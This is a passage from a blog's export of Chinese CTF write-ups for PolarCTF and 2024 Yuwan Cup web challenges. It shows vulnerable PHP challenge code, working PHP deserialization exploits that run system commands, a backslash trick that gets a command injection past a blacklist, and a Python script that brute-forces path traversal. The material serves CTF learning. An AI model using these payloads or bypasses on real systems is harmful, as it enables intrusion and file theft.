punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'easy'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ExpÔºö</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Easy</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Evil</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$evil</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$env</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Easy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">-></span><span class="token property">evil</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'tac f1@g.php'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><h4 id="Êú∫Âô®‰∫∫"><a href="#Êú∫Âô®‰∫∫" class="headerlink" title="Êú∫Âô®‰∫∫"></a>Êú∫Âô®‰∫∫</h4><p>ËÆøÈóÆ<code>robots.txt</code>ÂæóÂà∞ÂâçÂçäÊÆµflagÂíåÊïèÊÑüÁõÆÂΩï  ‰ΩÜÊòØË¶ÅËá™Â∑±Ë°•‰∏™flag.php Ê≤°ËßÅËøá</p><h4 id="Êâ´Êâ´Áúã"><a href="#Êâ´Êâ´Áúã" class="headerlink" title="Êâ´Êâ´Áúã"></a>Êâ´Êâ´Áúã</h4><p>SignIn</p><h4 id="debudao"><a href="#debudao" class="headerlink" title="debudao"></a>debudao</h4><p>flagËóèÂú®cookieÈáåÈù¢</p><h4 id="ÂÆ°ËÆ°"><a href="#ÂÆ°ËÆ°" class="headerlink" title="ÂÆ°ËÆ°"></a>ÂÆ°ËÆ°</h4><pre class="language-php" data-language="php"><code class="language-php">no no no! <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xxs'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xxs'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ÈîôËØØÔºöËæìÂÖ•Á±ªÂûã‰∏çÂÖÅËÆ∏‰∏∫Êï∞ÁªÑ„ÄÇ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^0e[0-9]+$/"</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ÈîôËØØÔºöËæìÂÖ•ÁöÑMD5ÂÄºÂøÖÈ°ª‰ª•'0e'ÂºÄÂ§¥ÔºåÂπ∂Ë∑üÈöèÊï∞Â≠ó„ÄÇ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ÈîôËØØÔºöËæìÂÖ•ÂøÖÈ°ªÊòØÊï∞Â≠ó„ÄÇ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ÊÅ≠ÂñúÔºö"</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ÈîôËØØÔºöÂøÖÈ°ªËÆæÁΩÆÊ≠£Á°ÆÂèÇÊï∞„ÄÇ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>ÈîôËØØÔºöÂøÖÈ°ªËÆæÁΩÆÊ≠£Á°ÆÂèÇÊï∞„ÄÇ</code></pre><p>Ê≤°ÊÑèÊÄù<code>?xxs=240610708</code></p><h4 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h4><p>ÂéüÈ¢ò Ê≤°ÊÑèÊÄù</p><h4 id="rapyiquan-ÂèçÊñúÊù†"><a href="#rapyiquan-ÂèçÊñúÊù†" class="headerlink" title="rapyiquan(ÂèçÊñúÊù† \)"></a>rapyiquan(ÂèçÊñúÊù† <code>\</code>)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">checkUrlParams</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'_'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkUrlParams</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c_md'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ls|dir|flag|type|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|>/i"</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"badly!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`$cmd`</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$url</span></span>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hack"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ÂèçÊñúÊù†ÁªïËøá  sortËæìÂá∫ÂáΩÊï∞‰πüÂèØ‰ª•</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token punctuation">[</span>md<span class="token operator">=</span>ta\c <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>fl\ag<span class="token operator">.</span>php</code></pre><h4 id="bllbl-ser1"><a href="#bllbl-ser1" class="headerlink" title="bllbl_ser1"></a>bllbl_ser1</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">bllbl</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$qiang</span><span class="token punctuation">;</span><span class="token comment">//ÊàëÁöÑÂº∫</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">bllliang</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">bllliang</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">qiang</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">bllnbnl</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$er</span><span class="token punctuation">;</span><span class="token comment">//ÊàëÁöÑÂÑø</span>    <span class="token keyword">function</span> <span class="token function-definition function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">er</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'blljl'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$user_data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'blljl'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>Exp:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">bllbl</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$qiang</span><span class="token punctuation">;</span><span class="token comment">//ÊàëÁöÑÂº∫</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">bllnbnl</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$er</span><span class="token punctuation">;</span><span class="token comment">//ÊàëÁöÑÂÑø</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">bllbl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">qiang</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">bllnbnl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">qiang</span><span class="token operator">-></span><span class="token property">er</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system('tac /flag');"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>Payload:</p><pre class="language-http" data-language="http"><code class="language-http">?blljl=O:5:"bllbl":1:&#123;s:5:"qiang";O:7:"bllnbnl":1:&#123;s:2:"er";s:20:"system('tac /flag');";&#125;&#125;</code></pre><h4 id="1ncIud3"><a href="#1ncIud3" class="headerlink" title="1ncIud3"></a>1ncIud3</h4><p>?page&#x3D;flagÂØπÂ∫î‰∫Ü.&#x2F;flag.phpÔºåÊñá‰ª∂ÂêéÁºÄÂÜôÊ≠ª‰∫ÜÊòØphp</p><p>ÁªèËøáÊµãËØïÂèëÁé∞È¢òÁõÆ‰ºöÂ∞Ü..&#x2F;ÊõøÊç¢‰∏∫Á©∫ÔºåÂèåÂÜôÁªïËøáÂèØ‰ª•ÁõÆÂΩïÁ©øË∂ä</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> itertools <span class="token keyword">import</span> product<span class="token keyword">import</span> time<span class="token comment"># ÂÆö‰πâÂ≠óÁ¨¶ÊõøÊç¢ËßÑÂàô</span>replace_list <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'f'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'l'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'L'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'@'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'g'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token comment"># ÁõÆÊ†áÂ≠óÁ¨¶‰∏≤</span>target <span class="token operator">=</span> <span class="token string">"flag"</span><span class="token comment"># ÁîüÊàêÊâÄÊúâÂèØËÉΩÁöÑÁªÑÂêà</span><span class="token keyword">def</span> <span class="token function">generate_combinations</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> replace_list<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Â∞ÜÁõÆÊ†áÂ≠óÁ¨¶‰∏≤ÊãÜÂàÜÊàêÂ≠óÁ¨¶ÂàóË°®</span>    chars <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>        <span class="token comment"># ÁîüÊàêÊØè‰∏™Â≠óÁ¨¶ÁöÑÊâÄÊúâÂèØËÉΩÊõøÊç¢</span>    replacements <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> chars<span class="token punctuation">:</span>        <span class="token keyword">if</span> char <span class="token keyword">in</span> replace_list<span class="token punctuation">:</span>            replacements<span class="token punctuation">.</span>append<span class="token punctuation">(</span>replace_list<span class="token punctuation">[</span>char<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            replacements<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>char<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment"># ‰ΩøÁî® itertools.product ÁîüÊàêÊâÄÊúâÂèØËÉΩÁöÑÁªÑÂêà</span>    combinations <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>combination<span class="token punctuation">)</span> <span class="token keyword">for</span> combination <span class="token keyword">in</span> product<span class="token punctuation">(</span><span class="token operator">*</span>replacements<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> combinations<span class="token comment"># ÁîüÊàêÊâÄÊúâÂèØËÉΩÁöÑÁªÑÂêà</span>combinations <span class="token operator">=</span> generate_combinations<span class="token punctuation">(</span>target<span class="token punctuation">,</span> replace_list<span class="token punctuation">)</span><span class="token comment"># ÁõÆÊ†á URL</span>url <span class="token operator">=</span> <span class="token string">"http://2e60dd05-b51e-49bf-9e32-2fef866f4105.www.polarctf.com:8090/"</span>  <span class="token comment"># ÊõøÊç¢‰∏∫ÂÆûÈôÖÁöÑ API URL</span><span class="token comment"># ÂèëÈÄÅËØ∑Ê±Ç</span><span class="token keyword">for</span> combination <span class="token keyword">in</span> combinations<span class="token punctuation">:</span>    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"page"</span><span class="token punctuation">:</span> <span class="token string">"..././..././"</span><span class="token operator">+</span>combination<span class="token punctuation">&#125;</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token comment"># ÊâìÂç∞ÂìçÂ∫î</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Sent: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>combination<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Response: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response<span class="token punctuation">.</span>status_code<span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response<span class="token punctuation">.</span>text<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token comment"># Â¶ÇÊûúÂìçÂ∫î‰∏≠ÂåÖÂê´ÁâπÂÆöÁöÑÂÜÖÂÆπÔºåÂèØ‰ª•ÂÅúÊ≠¢ÂèëÈÄÅËØ∑Ê±Ç</span>    <span class="token keyword">if</span> <span class="token string">"flag"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Found special response with combination: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>combination<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">break</span></code></pre><p>ps: Âæà‰∏çËß£ÁöÑ‰∏ÄÈÅìÈ¢ò</p><h4 id="ÊäïÂñÇ"><a href="#ÊäïÂñÇ" class="headerlink" title="ÊäïÂñÇ"></a>ÊäïÂñÇ</h4><pre class="language-markup" data-language="markup"><code class="language-markup">Welcome to the CTF Challenge!Use the following API to interact:POST a parameter "data" containing serialized User objectHint: You might want to understand how PHP serialization works. Try to serialize a User object with the username and is_admin properties.Extra Hint: If you can make the server think you are an admin (is_admin=true), you might get something special.</code></pre><p>Ê†πÊçÆÈ¢òÊÑèÂç≥ÂèØ</p><p>Exp:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$is_admin</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">is_admin</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PolarCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024Âæ°ÂÆõÊùØ-web</title>
      <link href="/2024/09/15/2024%E5%BE%A1%E5%AE%9B%E6%9D%AF-web/"/>
      <url>/2024/09/15/2024%E5%BE%A1%E5%AE%9B%E6%9D%AF-web/</url>
      
        <content type="html"><![CDATA[<h4 id="Êù•Á≠æ‰∏™Âà∞Âêß"><a href="#Êù•Á≠æ‰∏™Âà∞Âêß" class="headerlink" title="Êù•Á≠æ‰∏™Âà∞Âêß~~"></a>Êù•Á≠æ‰∏™Âà∞Âêß~~</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"\x69\x64"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\150\x65\156\141\156"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">goto</span> lklsgyy<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">echo</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\107\132\103\124\106\137\106\114\101\107"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> lklsgyy<span class="token punctuation">:</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"\x69\x64"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\150\x65\156\141\156"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">goto</span> lklsgyy<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></code></pre><ul><li><code>\x69\x64</code> ÊòØ‰∏Ä‰∏™ÂçÅÂÖ≠ËøõÂà∂ËΩ¨‰πâÂ∫èÂàóÔºåË°®Á§∫Â≠óÁ¨¶‰∏≤ <code>&quot;id&quot;</code>„ÄÇ</li><li><code>\150\x65\156\141\156</code> ÊòØ‰∏Ä‰∏™ÂÖ´ËøõÂà∂ÂíåÂçÅÂÖ≠ËøõÂà∂ËΩ¨‰πâÂ∫èÂàóÔºåË°®Á§∫Â≠óÁ¨¶‰∏≤ <code>&quot;henan&quot;</code>„ÄÇ</li><li><code>base64_encode(&quot;\150\x65\156\141\156&quot;)</code> Â∞ÜÂ≠óÁ¨¶‰∏≤ <code>&quot;henan&quot;</code> ÁºñÁ†Å‰∏∫base64„ÄÇ</li></ul><p>‰ª£Á†ÅÊ£ÄÊü• <code>$_REQUEST</code> Êï∞ÁªÑ‰∏≠ÁöÑ <code>id</code> ÂèÇÊï∞ÔºàÂåÖÊã¨ <code>$_GET</code> Âíå <code>$_POST</code> Êï∞ÊçÆÔºâÊòØÂê¶Á≠â‰∫é <code>&quot;henan&quot;</code> ÁöÑbase64ÁºñÁ†ÅÂÄº„ÄÇ</p><ul><li><code>&quot;henan&quot;</code> ÁöÑbase64ÁºñÁ†ÅÂÄºÊòØ <code>&quot;aGVuYW4=&quot;</code>„ÄÇ</li></ul><p>Â¶ÇÊûú <code>id</code> ÂèÇÊï∞‰∏çÁ≠â‰∫é <code>&quot;aGVuYW4=&quot;</code>Ôºå‰ª£Á†Å‰ºöË∑≥ËΩ¨Âà∞Ê†áÁ≠æ <code>lklsgyy</code>„ÄÇ</p><h4 id="ËÆ∞ÂæóÂåøÂêçÂìü"><a href="#ËÆ∞ÂæóÂåøÂêçÂìü" class="headerlink" title="ËÆ∞ÂæóÂåøÂêçÂìü~"></a>ËÆ∞ÂæóÂåøÂêçÂìü~</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">class</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//ËøôË°å‰ª£Á†ÅÈîÄÊØÅ‰∫ÜÂèòÈáè $aÔºåÂõ†Ê≠§‰πãÂâçÂàõÂª∫ÁöÑÂåøÂêçÁ±ªÂÆû‰æã‰∏çÂÜçÂèØÁî®„ÄÇ</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><h4 id="ÊêúÁ¥¢‰∏Ä‰∏ã"><a 